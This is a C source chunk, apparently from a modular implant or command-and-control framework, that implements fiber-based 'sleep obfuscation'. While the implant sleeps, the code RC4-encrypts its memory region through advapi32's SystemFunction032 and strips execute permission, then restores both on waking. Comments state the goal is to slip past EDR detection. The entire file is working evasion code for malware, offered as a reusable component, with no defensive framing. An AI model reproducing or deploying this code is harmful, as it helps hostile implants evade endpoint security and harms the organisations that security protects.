// chunk: evasion/sleep_lazarus
// depends: (none)
// provides: ekko_sleep
// headers: windows.h
// risk: medium
// note: Fiber-based sleep obfuscation — converts thread to fiber, creates sleeper fiber that encrypts memory, sleeps, decrypts, then switches back. EDRs often miss fiber context switches since fibers share the same thread and have no kernel-visible transition.

#ifndef CHUNK_SLEEP_LAZARUS
#define CHUNK_SLEEP_LAZARUS

typedef NTSTATUS (NTAPI *pfnSystemFunction032_laz)(
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } *data,
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } *key
);

static volatile int g_lazarus_initialized = 0;
static pfnSystemFunction032_laz g_laz_SF032 = NULL;

static int lazarus_init(void) {
    if (g_lazarus_initialized) return 1;

    HMODULE advapi = LoadLibraryA("advapi32.dll");
    if (!advapi) return 0;

    g_laz_SF032 = (pfnSystemFunction032_laz)GetProcAddress(advapi, "SystemFunction032");
    if (!g_laz_SF032) return 0;

    g_lazarus_initialized = 1;
    return 1;
}

static void laz_crypt(BYTE *addr, DWORD size, BYTE *key, DWORD key_len) {
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } data_blob;
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } key_blob;

    data_blob.Buffer = addr;
    data_blob.Length = data_blob.MaximumLength = size;
    key_blob.Buffer = key;
    key_blob.Length = key_blob.MaximumLength = key_len;

    g_laz_SF032(&data_blob, &key_blob);
}

typedef struct {
    BYTE *base;
    DWORD size;
    DWORD sleep_ms;
    BYTE key[16];
    LPVOID main_fiber;
} laz_fiber_ctx_t;

static void CALLBACK laz_sleep_fiber(LPVOID param) {
    laz_fiber_ctx_t *ctx = (laz_fiber_ctx_t *)param;

    while (1) {
        // Encrypt the implant region
        laz_crypt(ctx->base, ctx->size, ctx->key, sizeof(ctx->key));

        // Remove execute permission
        DWORD old;
        VirtualProtect(ctx->base, ctx->size, PAGE_READWRITE, &old);

        // Sleep in the fiber context — EDR sees a fiber sleeping, not the main thread
        Sleep(ctx->sleep_ms);

        // Restore permissions and decrypt
        DWORD dummy;
        VirtualProtect(ctx->base, ctx->size, PAGE_EXECUTE_READWRITE, &dummy);
        laz_crypt(ctx->base, ctx->size, ctx->key, sizeof(ctx->key));
        VirtualProtect(ctx->base, ctx->size, PAGE_EXECUTE_READ, &dummy);

        // Switch back to the main fiber
        SwitchToFiber(ctx->main_fiber);
    }
}

static void ekko_sleep(DWORD ms, BYTE *base, DWORD size) {
    if (!g_lazarus_initialized && !lazarus_init()) {
        Sleep(ms);
        return;
    }

    // Convert current thread to fiber if not already
    LPVOID main_fiber = ConvertThreadToFiber(NULL);
    if (!main_fiber) {
        // Already a fiber — get current fiber
        main_fiber = GetCurrentFiber();
        if (!main_fiber) { Sleep(ms); return; }
    }

    laz_fiber_ctx_t ctx;
    ctx.base = base;
    ctx.size = size;
    ctx.sleep_ms = ms;
    ctx.main_fiber = main_fiber;

    // Generate per-sleep random key
    DWORD tick = GetTickCount();
    for (int i = 0; i < 16; i++)
        ctx.key[i] = (BYTE)((tick >> (i % 4 * 8)) ^ (i * 0xB7 + 0x4E));

    // Create the sleeper fiber
    LPVOID sleep_fiber = CreateFiber(0, laz_sleep_fiber, &ctx);
    if (!sleep_fiber) {
        ConvertFiberToThread();
        Sleep(ms);
        return;
    }

    // Switch to sleeper — it encrypts, sleeps, decrypts, then switches back here
    SwitchToFiber(sleep_fiber);

    // Back from sleep fiber — clean up
    DeleteFiber(sleep_fiber);
    ConvertFiberToThread();
    SecureZeroMemory(ctx.key, sizeof(ctx.key));
}

#endif
